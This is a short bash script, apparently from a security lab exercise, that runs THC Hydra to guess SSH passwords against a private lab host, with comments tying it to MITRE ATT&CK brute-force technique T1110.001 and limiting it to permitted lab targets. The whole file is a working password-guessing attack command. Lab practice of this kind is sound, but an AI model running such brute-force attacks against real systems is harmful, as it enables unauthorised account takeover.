#!/usr/bin/env bash
# Task 4 - Run on KALI (attacker). SSH password-guessing attack with THC Hydra.
# MITRE ATT&CK T1110.001 (Brute Force: Password Guessing).
# -L usernames file  -P passwords file  -t 4 parallel tasks  -V verbose per attempt
# For lab use only, against the lab-owned target you have permission to test.

TARGET=10.0.0.7

hydra -L usernames.txt -P passwords.txt -t 4 -V ssh://"$TARGET"
